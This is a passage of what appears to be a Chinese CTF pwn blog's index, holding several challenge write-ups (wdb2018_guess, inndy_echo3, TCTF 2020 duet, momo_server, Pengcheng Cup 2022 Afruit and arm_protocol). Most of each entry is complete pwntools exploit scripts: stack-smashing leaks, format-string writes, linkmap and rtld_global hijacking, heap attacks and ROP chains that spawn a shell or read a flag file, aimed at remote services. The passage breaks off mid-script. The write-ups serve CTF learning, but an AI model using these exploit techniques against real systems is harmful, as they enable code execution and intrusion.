FILE","爆破"]},{"title":"wdb2018_guess(stack smashing泄漏信息)","url":"/2020/04/30/%E7%BD%91%E9%BC%8E%E6%9D%AF2018_guess/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下\nFlag读取并存储在栈里\n\n\nFork三次子进程，然后有gets函数，导致栈溢出，但是有canary保护。\n\n\n由于使用了gets，因此可以无限制溢出，并且有三次机会。那么，我们可以利用stack smashing报错，来输出信息。第一次，我们泄露函数的got表内容，为了得到glibc地址。得到glibc地址，是为了计算出stack_end变量的地址，进而，第二次，我们泄露栈地址，计算出flag存放的地址，于是，第三次，我们就可以泄露flag的值。\n#coding:utf8from pwn import *from LibcSearcher import *#sh = process(&#x27;./GUESS&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,29890)elf = ELF(&#x27;./GUESS&#x27;)puts_got = elf.got[&#x27;puts&#x27;]def stackoverflow(payload):   sh.sendlineafter(&#x27;Please type your guessing flag&#x27;,payload)#泄露puts地址stackoverflow(&#x27;a&#x27;*0x128 + p64(puts_got))sh.recvuntil(&#x27;stack smashing detected ***: &#x27;)puts_addr = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)environ_addr = libc_base + libc.dump(&#x27;__environ&#x27;)print &#x27;environ_addr=&#x27;,hex(environ_addr)#泄露栈地址stackoverflow(&#x27;a&#x27;*0x128 + p64(environ_addr))sh.recvuntil(&#x27;stack smashing detected ***: &#x27;)stack_addr = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))flag_addr = stack_addr - 0x168print &#x27;flag_addr=&#x27;,hex(flag_addr)#泄露flagstackoverflow(&#x27;a&#x27;*0x128 + p64(flag_addr))sh.interactive()","categories":["CTF"],"tags":["栈溢出","___stack_chk_fail"]},{"title":"通过劫持ld中的linkmap来控制程序流","url":"/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/","content":"在glibc中，当一个程序调用glibc中的exit函数时，exit函数内部会调用_dl_fini，而_dl_fini函数会调用程序中的fini_array段的函数指针去执行。查看glibc源码如下\nvoidinternal_function_dl_fini (void)&#123;..........              /* First see whether an array is given.  */              if (l-&gt;l_info[DT_FINI_ARRAY] != NULL)            &#123;              ElfW(Addr) *array =                (ElfW(Addr) *) (l-&gt;l_addr                        + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);              unsigned int i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val                        / sizeof (ElfW(Addr)));              while (i-- &gt; 0)                ((fini_t) array[i]) ();            &#125;............&#125;\n\n我们注意到，有一个函数指针数组的遍历调用执行。我们来看看ld.so中相应的汇编。\n在glibc2.23 32位ld.so里，是这样的，一个循环，直到esi为0，如果我们能够接触linkmap，就可以控制edi,esi，从而将fini_array转移到我们可以控制的地方，在可控区布下ROP。\n\n\n再来看看64位的\n\n\n差不多也是这样，如果我们要做栈迁移，可以配合上一些gadget和setcontext的gadget，就可以将栈也迁移到我们可控的区域。\n在glibc2.29以上，这点非常有用。在glibc 2.29，setcontext内部的参数不再是rdi，而是rdx，而我们劫持free_hook时，能控制的是rdi，可以借助其他gadget完成对rdx的转移。\n\n\n然后，当我们劫持了linkmap将fini_array转移到可控区以后，就不用再寻找gagdets来对rdx转移。我们看到在glibc 2.29下，其汇编是这样的\n\n\n可见，rdx在第二次调用时，也指向了可控区，因此，我们结合setcontext即可在同一个可控区一次性完成布置。结合large bin attack，通过large bin attack向link_map里的l_addr写入一个堆地址，这又成为一种堆利用手法，我暂且叫他house of haivk。\n下面，我们用两个例题来说明其利用方式\ninndy_echo3首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，主函数通过alloca申请了一块随机大小的栈地址，然后传给hardfmt函数\n\n\nHardfmt里有一个非栈上的格式化字符串漏洞，可以利用5次。\n\n\n由于在main里申请了随机大小的栈空间，因此hardfmt里相对栈里其他数据的距离会发生变化，因此，我们需要先拿一个固定的爆破。\ndef exploit():   payload = &#x27;%8$p-%14$pEND&#x27;   sh.sendline(payload)   _IO_2_1_stdout_addr = int(sh.recvuntil(&#x27;-&#x27;,drop = True),16)   if _IO_2_1_stdout_addr &amp; 0xFFF != 0xD60:      raise Exception(&#x27;leak error&#x27;)\n\n然后，我们就可以泄露地址，进而下一步利用。在这里，普通方法是继续利用格式化字符串，劫持栈做ROP等。这里，再介绍另一种方法，劫持linkmap里的l_addr，将fini_array转移到bss上的buff可控区内。[注意到栈里下方一个ld地址，其正好指向了linkmap里的l_addr的位置。]{.mark}\n\n\n因此，我们只需利用一次格式化字符串，即可将fini_array迁移到buff里。\n\n\n劫持以后，此时esi为1，意味着我们执行完这一次，不能继续执行后面的函数指针了。因此，首先利用gadgets将esi的值改大。现在edi指向我们的可控区buff，我们找到一条gadget\n#修改esior esi, dword ptr [edi + 0xa] ; ret\n将esi改大后，我们就可以继续执行下一个函数了，我们依次执行gets、system，即可完成system(command)的功能。\n#coding:utf8from pwn import *libc = ELF(&#x27;./libc-2.23_x86.so&#x27;)context.log_level = &#x27;debug&#x27;def exploit():   payload = &#x27;%8$p-%14$pEND&#x27;   sh.sendline(payload)   _IO_2_1_stdout_addr = int(sh.recvuntil(&#x27;-&#x27;,drop = True),16)   if _IO_2_1_stdout_addr &amp; 0xFFF != 0xD60:      raise Exception(&#x27;leak error&#x27;)   stack_addr = int(sh.recvuntil(&#x27;END&#x27;,drop = True),16)   libc_base = _IO_2_1_stdout_addr - libc.sym[&#x27;_IO_2_1_stdout_&#x27;]   #or esi, dword ptr [edi + 0xa] ; ret   or_esi_p_edi_a = libc_base + 0x001760d2   #push eax ; call dword ptr [eax + 0x10]   push_eax_call = libc_base + 0x0005d4e2   system_addr = libc_base + libc.sym[&#x27;system&#x27;]   gets_addr = libc_base + libc.sym[&#x27;gets&#x27;]   print &#x27;libc_base=&#x27;,hex(libc_base)   print &#x27;stack_addr=&#x27;,hex(stack_addr)   payload = &#x27;a&#x27;*0x20   payload += p32(or_esi_p_edi_a)   payload += &#x27;\\x00&#x27;*6   payload += p32(0x10) #使得or运算后，esi为0x10，这样就可以继续做rop了   payload += &#x27;\\x00&#x27;*0x2A   payload += p32(push_eax_call) #gets调用完后，call [eax+0x10]处设置为system即可   payload += p32(gets_addr) #先调用gets，然后eax返回了缓冲区地址   sh.sendline(payload)   sh.recvuntil(&#x27;a&#x27;*0x20)   payload = &#x27;a&#x27;*0x10 + &#x27;\\x00&#x27;   sh.sendline(payload)   sh.recvuntil(&#x27;a&#x27;*0x10)   payload = &#x27;a&#x27;*0x10 + &#x27;\\x00&#x27;   sh.sendline(payload)   sh.recvuntil(&#x27;a&#x27;*0x10)   #修改linkmap里的r_offset   payload = &#x27;%&#x27; + str(0x194) + &#x27;c%91$n\\x00&#x27;   #raw_input()   sh.sendline(payload)   payload = &#x27;/bin/sh\\x00&#x27;.ljust(0x10) + p32(system_addr)   #raw_input()   sleep(0.2)   sh.sendline(payload)while True:   try:      global sh      #sh = process(&#x27;./echo3&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23_x86.so&#x27;&#125;)      sh = remote(&#x27;node3.buuoj.cn&#x27;,25102)      exploit()      sh.interactive()   except:      sh.close()      print &#x27;trying...&#x27;\n\nTCTF 2020 duet首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下\n在backdoor里有溢出一字节的机会，但只能用1次\n\n\nAdd功能中使用的是calloc，会清空数据\n\n\n我们可以利用1字节溢出构造overlap chunk，然后进行Tcache Stashing Unlink Attack将global_max_fast修改为很大，然后，我们delete一个chunk，被放到fastbin里，在main_arena里，会留下一个1，这个1，可以被我们用来伪造一个0x100的fastbin，我们控制现有的fastbin的chunk，将main_arena里伪造的串入，然后申请到main_arena控制整个main_arena。有关TCACHE Stashing Unlink attack，可以见这篇文章https://blog.csdn.net/seaaseesa/article/details/105870247\n控制了main_arena，接下来，我们可以通过修改top chunk为任意位置的chunk处，从而分配到任意地址处，但是现在问题是，free_hook处没有可用的数据用于伪造，如果要让其有数据，还得再来一次堆攻击，但是现在堆已经混乱了，不好操作，而malloc_hook处使用one_gadget也打不通，现在一个好的方法就是劫持linkmap了，在linkmap里有很多数据可以供我们伪造chunk的size，从而分配过去。然后，利用setcontext，即可完成栈迁移，将栈一并迁移到linkmap里。\n# -*- coding:utf-8 -*-from pwn import *#context.log_level = &#x27;debug&#x27;#sh = process(&#x27;./duet&#x27;)sh = remote(&#x27;pwnable.org&#x27;,12356)libc = ELF(&#x27;/usr/lib/x86_64-linux-gnu/libc-2.29.so&#x27;)malloc_hook_s = libc.sym[&#x27;__malloc_hook&#x27;]#l_addr_offset = 0x222190l_addr_offset = 0x21b190def add(index, size, content):    sh.sendlineafter(&#x27;: &#x27;, &#x27;1&#x27;)    if(index == 0):        sh.sendlineafter(&#x27;Instrument: &#x27;, &#x27;琴&#x27;)    elif(index == 1):        sh.sendlineafter(&#x27;Instrument: &#x27;, &#x27;瑟&#x27;)    sh.sendlineafter(&#x27;Duration: &#x27;, str(size))    sh.sendafter(&#x27;Score: &#x27;, content)def delete(index):    sh.sendlineafter(&#x27;: &#x27;, &#x27;2&#x27;)    if(index == 0):        sh.sendlineafter(&#x27;Instrument: &#x27;, &#x27;琴&#x27;)    elif(index == 1):        sh.sendlineafter(&#x27;Instrument: &#x27;, &#x27;瑟&#x27;)def show(index):    sh.sendlineafter(&#x27;: &#x27;, &#x27;3&#x27;)    if(index == 0):        sh.sendlineafter(&#x27;Instrument: &#x27;, &#x27;琴&#x27;)    elif(index == 1):        sh.sendlineafter(&#x27;Instrument: &#x27;, &#x27;瑟&#x27;)def backdoor(size):    sh.sendlineafter(&#x27;: &#x27;, &#x27;5&#x27;)    sh.sendlineafter(&#x27;: &#x27;, str(size))for i in range(6):    add(0, 0x80, &#x27;a&#x27; * 0x80)    delete(0)for i in range(7):    add(0, 0xd0, &#x27;a&#x27; * 0xd0)    delete(0)for i in range(7):    add(0, 0x230, &#x27;a&#x27; * 0x230)    delete(0)for i in range(7):    add(0, 0x280, &#x27;a&#x27; * 0x280)    delete(0)for i in range(7):    add(0, 0x2f8, &#x27;a&#x27; * 0x2f8)    delete(0)for i in range(7):    add(0, 0x3f8, &#x27;a&#x27; * 0x3f8)    delete(0)for i in range(7):    add(0, 0xf0, &#x27;a&#x27; * 0xf0)    delete(0)add(0, 0x2f8, &#x27;a&#x27; * 0x2f8)add(1, 0x3f8, &#x27;b&#x27; * 0x70 + p64(0x2f0) + p64(0x20) + &#x27;f&#x27; * (0x280 - 0x80) + (p64(0) + p64(0x21)) * 7 + p64(0x300) + p64(0x21) + p64(0x21) * int((0x3f8 - 0x300)/8))delete(0)# delete(1)backdoor(0xf1)add(0, 0x280, &#x27;c&#x27; * 0x268 + p64(0x301) + &#x27;d&#x27; * 0x10)show(1)sh.recvuntil(&#x27;d&#x27; * 0x10)sh.recvn(0x10)main_arena_xx = u64(sh.recv(6).ljust(0x8,&#x27;\\x00&#x27;))malloc_hook_addr = (main_arena_xx &amp; 0xFFFFFFFFFFFFF000) + (malloc_hook_s &amp; 0xFFF)libc_base = malloc_hook_addr - malloc_hook_sopen_addr = libc_base + libc.sym[&#x27;open&#x27;]read_addr = libc_base + libc.sym[&#x27;read&#x27;]write_addr = libc_base + libc.sym[&#x27;write&#x27;]pop_rax = libc_base + 0x0000000000047cf8pop_rdi = libc_base + 0x0000000000026542pop_rsi = libc_base + 0x0000000000026f9epop_rdx = libc_base + 0x000000000012bda6syscall_ret = read_addr + 0xFret = libc_base + 0x000000000002535fbss = libc_base + libc.bss()global_fast_max = libc_base + 0x1e7600print hex(main_arena_xx)print &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;global_fast_max=&#x27;,hex(global_fast_max)libc_addr = libc_base# pause()delete(0)delete(1)add(1, 0x200, &#x27;h&#x27; * 0x200)add(0, 0x260, p64(0x21) * (0x46+6))delete(1)add(1, 0xd0, &#x27;s&#x27; * 0x50 + p64(0) + p64(0x241) + &#x27;s&#x27; * 0x70)# pause()delete(0)show(1)sh.recvuntil(&#x27;s&#x27; * 0x50)sh.recvn(0x10)heap_addr = u64(sh.recvn(8))success(&#x27;heap_addr: &#x27; + hex(heap_addr))add(0, 0x1a0, &#x27;u&#x27; * 0x70 + p64(0) + p64(0x21) + &#x27;u&#x27; * 0x120)delete(1)add(1, 0xd0, &#x27;q&#x27; * 0x50 + p64(0) + p64(0x291) + &#x27;q&#x27; * 0x70)delete(0)# pause()add(0, 0x280, &#x27;w&#x27; * 0x70 + p64(0x21) * 6 + &#x27;w&#x27; * 0x100 + p64(0) + p64(0x101) + p64(heap_addr) + p64(libc_addr + 0x1e7600 + 4 - 0x10) + &#x27;w&#x27; * (0x250 - 0x1b0) + p64(0) + p64(0x101) + p64(libc_addr + 0x1e4d20) + p64(heap_addr - 0xc0))# libc_addr + 0x1e7600 - 0x10 + 4# delete(0)delete(1)add(1, 0xd0, &#x27;q&#x27; * 0x50 + p64(0) + p64(0x401) + &#x27;q&#x27; * 0x70)delete(1)add(1, 0x3f0, p64(0x21) * int(0x3f0/8))delete(1)add(1, 0x80, &#x27;a&#x27; * 0x80) #触发Tcache Stashing Unlink Attackdelete(0) #接下来，这个chunk被放入fastbin，在main_arena留下一个1，这个1可以用来伪造fastbin的sizedelete(1)add(0, 0x3f0, &#x27;o&#x27; * 0x260 + p64(0) + p64(0x101) + p64(libc_addr + 0x1e4c3F) + p64(0) + p64(0x21) * int((0x3f0 - 0x280)/8)) #将main_arena里伪造fastbin链接到现有的fastbin里# pause()add(1, 0xf0, &#x27;a&#x27; * 0xf0)delete(0)payload =  &#x27;z&#x27; * 0x1 + &#x27;\\x00&#x27; * 0x50 + p64(libc_addr + l_addr_offset - 0x14) #top chunk指向linkmap-&gt;l_addr附近payload += p64(0) + p64(libc_addr + 0x1e4ca0)*2  #修复unsorted binpayload += p64(libc_addr + 0x1e4cb0)*2 + p64(libc_addr + 0x1e4cc0)*2 + p64(libc_addr + 0x1e4cd0)*2payload += p64(libc_addr + 0x1e4ce0)*2 + p64(libc_addr + 0x1e4cf0)*2 + p64(libc_addr + 0x1e4d00)*2 + p64(libc_addr + 0x1e4d10)*2  + p64(0)*2add(0, 0xf1,payload) #fastbin attack申请到main_arena里，控制main_arenadelete(1)setcontext_addr = libc_addr + libc.sym[&#x27;setcontext&#x27;]#伪造link_mappayload = &#x27;\\x00&#x27;*0x4payload += p64(libc_base + l_addr_offset + 0x20) #fini_array的基址payload += &#x27;\\x00&#x27;*0x10payload += p64(libc_base + l_addr_offset + 0x5A0)payload += p64(0)payload += p64(libc_addr + l_addr_offset)#此处，伪造一系列需要执行的函数虚表payload += p64(setcontext_addr + 0x35) #函数1，setcontext做栈迁移payload += p64(ret) #函数0，使得rdx指向link_map内部#这里布置rop，正好0x90rop= p64(0) + p64(pop_rsi) + p64(libc_base + l_addr_offset + 0x70) + p64(pop_rdx) + p64(0x100) + p64(read_addr)rop = rop.ljust(0x90,&#x27;a&#x27;)payload += rop#这里布置rsppayload += p64(libc_base + l_addr_offset + 0x40)#这里布置[rdx+0xA8]payload += p64(pop_rdi)payload = payload.ljust(0x114,&#x27;a&#x27;)payload += p64(libc_addr + l_addr_offset + 0x110) ##fini_array的偏移的指针payload += p64(0) ##fini_array的偏移payload += p64(libc_addr + l_addr_offset + 0x120) #函数个数变量的指针payload += p64(0x20) #函数个数payload = payload.ljust(0x1E0,&#x27;a&#x27;)add(1,0x1E0,payload)#执行rop，输入后续的主ropsh.sendlineafter(&#x27;:&#x27;,&#x27;6&#x27;)flag_str = libc_addr + l_addr_offset + 0x118rop = p64(pop_rdi) + p64(flag_str) + p64(pop_rsi) + p64(0) + p64(pop_rax) + p64(0x2) + p64(syscall_ret)rop += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(bss) + p64(pop_rdx) + p64(0x30) + p64(read_addr)rop += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(bss) + p64(pop_rdx) + p64(0x30) + p64(write_addr)rop += &#x27;/flag\\x00&#x27;sh.sendline(rop)sh.interactive()","categories":["CTF"],"tags":["格式化字符串漏洞","fastbin","Tcache_Stashing_Unlink_Attack","linkmap","dl_resolve"]},{"title":"骇极杯_2018_momo_server（条件竞争UAF）","url":"/2020/09/14/%E9%AA%87%E6%9E%81%E6%9D%AF_2018_momo_server/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下\nCount功能开启了一个线程\n\n\n该线程会异步进行堆的free操作，其中注意到free(ptr[i]-&gt;name)后，没有将name指针清零，并且该循环尾部会休眠1s。\n\n\n结尾会将ptr指针清零\n\n\n在add函数中，如果name已存在，那么仅更新count和flag。\n\n\n因此，我们在ptr[i]被清零之前，通过add更新count和flag，这样，name就会被二次free，也就是存在条件竞争double free漏洞。\n通过实验，发现在线程里调用free释放主线程里的堆后，只有当线程结束以后，堆chunk才会被放到主线程的arena里，并且不会放到tcache bin里，而是直接放到其他bin里。因此，我们可以构造fastbin的double free。\nAdd功能中，malloc的大小是解码前的数据大小，而复制的大小则是解码后的字符串计算长度。因此，[将\\x00数据进行URL编码，从而可以绕过第一次strlen计算的0截断问题。]{.mark}\n\n\nEcho功能可以用来泄露栈上的数据，但是本地栈和远程栈有些不一样，因此，我们猜测远程的数据为libc中的某个地址，然后通过多次枚举爆破，可以得到远程的libc地址。\n\n\n爆破\n\n\n#coding:utf8from pwn import *import urlliblibc = ELF(&#x27;./libc-2.27.so&#x27;)#context.log_level = &#x27;debug&#x27;def add(content,count):   payload = &#x27;POST /add Connection: keep-alive\\n\\n&#x27;   payload += &#x27;memo=&#x27; + content + &#x27;&amp;count=&#x27; + str(count)   sh.sendline(payload)   sh.recvuntil(&#x27;&#123;&quot;status&quot;:&quot;ok&quot;&#125;&#x27;)def delete():   payload = &#x27;POST /count Connection: keep-alive\\n\\n&#x27;   sh.sendline(payload)   sh.recvuntil(&#x27;&#123;&quot;status&quot;:&quot;ok&quot;&#125;&#x27;)def show():   payload = &#x27;GET /list Connection: keep-alive\\n\\n&#x27;   sh.sendline(payload)   sh.recvuntil(&#x27;Content-Type: text/html&#x27;)def echo(content):   payload = &#x27;POST /echo Connection: keep-alive\\n\\n&#x27;   payload += &#x27;content=&#x27; + content   sh.send(payload)def exploit(x):   echo(&#x27;a&#x27;*0x38)   sh.recvuntil(&#x27;a&#x27;*0x38)   offset = (x &lt;&lt; 12) + 0x9d0   libc_base = u64(sh.recvuntil(&#x27;&quot;&#125;&#x27;,drop = True).ljust(8,&#x27;\\x00&#x27;)) - offset   if libc_base &gt;&gt; 40 != 0x7F:      raise Exception(&#x27;leak error!&#x27;)   system_addr = libc_base + libc.sym[&#x27;system&#x27;]   print &#x27;libc_base=&#x27;,hex(libc_base)   print &#x27;system_addr=&#x27;,hex(system_addr)   add(&#x27;a&#x27;*0x30,1)   add(&#x27;b&#x27;*0x30,1)   add(&#x27;c&#x27;*0x30,1)   add(&#x27;d&#x27;*0x40,3)   #条件竞争UAF   delete()   sleep(2)   show()   sh.recvuntil(&#x27;count&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&#x27;)   name = sh.recvuntil(&#x27;&lt;/td&gt;&#x27;,drop = True)   heap_addr = u64(name.ljust(8,&#x27;\\x00&#x27;))   print &#x27;heap_addr=&#x27;,hex(heap_addr)   #条件竞争double free   add(name,1)   fake_chunk_got = 0x000000000060306A   #确保线程结束   sleep(3)   #通过URL编码，是的0x000000000060306A变成16进制字符串的形式，从而不会截断   add(urllib.quote(p32(0x60306A).ljust(0x30, &#x27;a&#x27;)),0x100)   add(&#x27;a&#x27;*0x30,0x100)   add(&#x27;b&#x27;*0x30,0x100)   payload = &#x27;c&#x27;*0x16 + urllib.quote(p64(system_addr))   payload = payload.ljust(0x30,&#x27;c&#x27;)   add(payload,0x100)   sh.send(&#x27;/bin/sh\\x00&#x27;)   sh.interactive()for x in range(0xFF):   print &#x27;x=&#x27;,hex(x)   while True:      try:         global sh         sh = remote(&#x27;node3.buuoj.cn&#x27;,25344) #远程最终爆破出x = 0x11         #sh = process(&#x27;./2018_momo_server&#x27;,env = &#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.27.so&#x27;&#125;)         exploit(x)         break      except Exception as e:         print &#x27;trying...&#x27;         sh.close()\n","categories":["CTF"],"tags":["UAF","线程堆","fastbin","条件竞争"]},{"title":"鹏城杯2022_Afruit","url":"/2022/07/04/%E9%B9%8F%E5%9F%8E%E6%9D%AF2022-Afruit/","content":"delete没有清空指针，导致UAF\n\n堆大小限制在large bin范围\n\n题目glibc环境为2.33，可以直接使用house of banana方法劫持rtld_global\n#coding:utf8from pwn import *#sh = process(&#x27;./A_fruit_patch&#x27;)sh = remote(&#x27;192.168.1.105&#x27;,8888)libc = ELF(&#x27;./libc-2.33.so&#x27;)#sh = process(&#x27;./A_fruit&#x27;)def add(size):   sh.sendlineafter(&#x27;5.Exit&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;size:&#x27;,str(size))def edit(index,content):   sh.sendlineafter(&#x27;5.Exit&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;index:&#x27;,str(index))   sh.sendafter(&#x27;content:&#x27;,content)def show(index):   sh.sendlineafter(&#x27;5.Exit&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;index:&#x27;,str(index))def delete(index):   sh.sendlineafter(&#x27;5.Exit&#x27;,&#x27;4&#x27;)   sh.sendlineafter(&#x27;index:&#x27;,str(index))add(0x410) #0add(0x410) #1delete(0)add(0x410) #2show(2)sh.recvuntil(&#x27;\\n&#x27;)enc1_1 = int(sh.recvuntil(&#x27;\\n&#x27;,drop = True),16)enc2_1 = int(sh.recvuntil(&#x27;\\n&#x27;,drop = True),16)edit(2,&#x27;aa&#x27;)show(2)sh.recvuntil(&#x27;\\n&#x27;)enc1_2 = int(sh.recvuntil(&#x27;\\n&#x27;,drop = True),16)edit(2,&#x27;a&#x27;*6)show(2)sh.recvuntil(&#x27;\\n&#x27;)sh.recvuntil(&#x27;\\n&#x27;)enc2_2 = int(sh.recvuntil(&#x27;\\n&#x27;,drop = True),16)def decrypt(enc1_1,enc2_1,enc1_2,enc2_2):   p = process(&#x27;./crack&#x27;)   p.sendafter(&#x27;mode:&#x27;,p32(1))   p.sendafter(&#x27;prefix:&#x27;,&#x27;aa&#x27;)   p.sendafter(&#x27;enc:&#x27;,p32(enc1_2))   p.recvuntil(&#x27;0x&#x27;)   w1 = int(p.recv(4),16)   p.close()   p = process(&#x27;./crack&#x27;)   p.sendafter(&#x27;mode:&#x27;,p32(2))   p.sendafter(&#x27;fix:&#x27;,p16(w1))   p.sendafter(&#x27;enc:&#x27;,p32(enc1_1))   p.recvuntil(&#x27;0x&#x27;)   w0 = int(p.recv(4),16)   p.close()   #print hex(w0),hex(w1)   p = process(&#x27;./crack&#x27;)   p.sendafter(&#x27;mode:&#x27;,p32(1))   p.sendafter(&#x27;prefix:&#x27;,&#x27;aa&#x27;)   p.sendafter(&#x27;enc:&#x27;,p32(enc2_2))   p.recvuntil(&#x27;0x&#x27;)   w3 = int(p.recv(4),16)   p.close()   p = process(&#x27;./crack&#x27;)   p.sendafter(&#x27;mode:&#x27;,p32(2))   p.sendafter(&#x27;fix:&#x27;,p16(w3))   p.sendafter(&#x27;enc:&#x27;,p32(enc2_1))   p.recvuntil(&#x27;0x&#x27;)   w2 = int(p.recv(4),16)   p.close()   #print hex(w2),hex(w3)   return (w3 &lt;&lt; 48) | (w2 &lt;&lt; 32) | (w1 &lt;&lt; 16) | w0libc_base = decrypt(enc1_1,enc2_1,enc1_2,enc2_2) - 0x1e0c00print &#x27;libc_base=&#x27;,hex(libc_base)_rtld_global_ptr_addr = libc_base + 0x222040print &#x27;_rtld_global_ptr_addr=&#x27;,hex(_rtld_global_ptr_addr)add(0x450) #3add(0x420) #4add(0x440) #5add(0x420) #6add(0x410) #7add(0x410) #8delete(0)delete(4)delete(6)add(0x500) #9add(0x420) #10add(0x420) #11add(0x410) #12show(10)sh.recvuntil(&#x27;\\n&#x27;)enc1_1 = int(sh.recvuntil(&#x27;\\n&#x27;,drop = True),16)enc2_1 = int(sh.recvuntil(&#x27;\\n&#x27;,drop = True),16)edit(10,&#x27;aa&#x27;)show(10)sh.recvuntil(&#x27;\\n&#x27;)enc1_2 = int(sh.recvuntil(&#x27;\\n&#x27;,drop = True),16)edit(10,&#x27;a&#x27;*6)show(10)sh.recvuntil(&#x27;\\n&#x27;)sh.recvuntil(&#x27;\\n&#x27;)enc2_2 = int(sh.recvuntil(&#x27;\\n&#x27;,drop = True),16)heap_addr = decrypt(enc1_1,enc2_1,enc1_2,enc2_2)print &#x27;heap_addr=&#x27;,hex(heap_addr)delete(3)#将3放入large binadd(0x500) #13#将5和7放入unsorted bindelete(5)delete(7)#修改large bin的bk_nextsizeedit(3,p64(0)*3 + p64(_rtld_global_ptr_addr-0x20))#large bin attack to hijack rtld_globaladd(0x410) #14fake_rtld_global_addr = heap_addr + 0x840add(0x440) #15edit(3,p64(libc_base + 0x1e1000)*2 + p64(heap_addr + 0x840)*2)delete(1)add(0x440) #16#fake rtld_globaledit(16,&#x27;\\x00&#x27;*0x420 + p64(0) + p64(libc_base + 0x2237d0) + p64(0) + p64(fake_rtld_global_addr))add(0x420) #17retn = libc_base + 0x52a92set_context = libc_base + 0x529adpop_rdi = libc_base + 0x0000000000028a55pop_rsi = libc_base + 0x000000000002a4cfpop_rdx = libc_base + 0x00000000000c7f32open_addr = libc_base + libc.sym[&#x27;open&#x27;]read_addr = libc_base + libc.sym[&#x27;read&#x27;]write_addr = libc_base + libc.sym[&#x27;write&#x27;]opendir_addr = libc_base + libc.sym[&#x27;opendir&#x27;]readdir_addr = libc_base + libc.sym[&#x27;readdir&#x27;]mov_p_rdi_rax = libc_base + 0x0000000000041a03#mov rdi, qword ptr [rdi + 0xe0] ; jmp raxmov_rdi_p_rdi = libc_base + 0x000000000007efddpop_rax = libc_base + 0x0000000000044c70flag_addr = heap_addr + 0x910rop = p64(flag_addr) + p64(pop_rsi) + p64(0)rop += p64(open_addr)rop += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(0x100) + p64(read_addr)rop += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(0x100) + p64(write_addr)rop += &#x27;./flag\\x00&#x27;print hex(len(rop))payload = rop.ljust(0xd0,&#x27;\\x00&#x27;)payload += p64(fake_rtld_global_addr + 0x8*0x24)payload += p64(0) + p64(fake_rtld_global_addr + 0x8*0x25)payload += p64(fake_rtld_global_addr + 0x8*0x32) + p64(0x10) #func countpayload = payload.ljust(0x150,&#x27;\\x00&#x27;)payload += p64(set_context)payload += p64(retn)payload += &#x27;\\x00&#x27;*0x98payload += p64(heap_addr + 0x880) #new rsppayload += p64(pop_rdi)payload = payload.ljust(0x31c-0x40,&#x27;\\x00&#x27;)payload += p32(0x8)edit(17,payload)sh.interactive()","categories":["CTF"],"tags":["UAF","large bin","house of banana","glibc 2.33"]},{"title":"鹏城杯2022_arm_protocol","url":"/2022/07/04/%E9%B9%8F%E5%9F%8E%E6%9D%AF2022-arm-protocol/","content":"首先使用md5进行比较，但使用的是strcmp，比较的字符串中含有\\0，可以导致截断\n\n于是可以爆破出符合的keyedit中存在off by one，可以通过溢出来扩大tcache bin chunk的size，然后delete后申请回来，就能制造overlap chunk，然后控制func指针和参数即可\n\n其中malloc_usable_size函数源码如下\nstatic size_tmusable (void *mem)&#123;  mchunkptr p;  if (mem != 0)    &#123;      p = mem2chunk (mem);      if (__builtin_expect (using_malloc_checking == 1, 0))        return malloc_check_get_size (p);      if (chunk_is_mmapped (p))\t&#123;\t  if (DUMPED_MAIN_ARENA_CHUNK (p))\t    return chunksize (p) - SIZE_SZ;\t  else\t    return chunksize (p) - 2 * SIZE_SZ;\t&#125;      else if (inuse (p))        return chunksize (p) - SIZE_SZ;    &#125;  return 0;&#125;size_t__malloc_usable_size (void *m)&#123;  size_t result;  result = musable (m);  return result;&#125;\n\n#coding:utf8from pwn import *#sh = remote(&#x27;127.0.0.1&#x27;,2333)sh = remote(&#x27;192.168.1.104&#x27;,8888)#sh = process(argv=[&#x27;qemu-arm&#x27;,&#x27;-g&#x27;,&#x27;1234&#x27;,&#x27;-L&#x27;,&#x27;arm_libc/usr/arm-linux-gnueabi&#x27;,&#x27;./arm_protocol&#x27;])#sh = process(argv=[&#x27;qemu-arm&#x27;,&#x27;-L&#x27;,&#x27;arm_libc/usr/arm-linux-gnueabi&#x27;,&#x27;./arm_protocol&#x27;])libc = ELF(&#x27;./libc-2.27.so&#x27;)def add(size):   index = 0   checksum = index ^ size   content = &#x27;\\x00&#x27;   payload = p32(0x11451400)   payload += p32(checksum)   payload += p32(size)   payload += p32(index)   payload += &#x27;\\x00&#x27;*0x3b   payload += &#x27;A\\x01\\x57\\xf5\\x61\\x00&#x27;   sh.sendafter(&#x27;&gt;&#x27;,payload)def show(index):   size = 0   checksum = index ^ size   content = &#x27;\\x00&#x27;   payload = p32(0x11451400)   payload += p32(checksum)   payload += p32(size)   payload += p32(index)   payload += &#x27;\\x00&#x27;*0x39   payload += p8(0x1)   payload += p8(0)   payload += &#x27;A\\x01\\x57\\xf5\\x61\\x00&#x27;   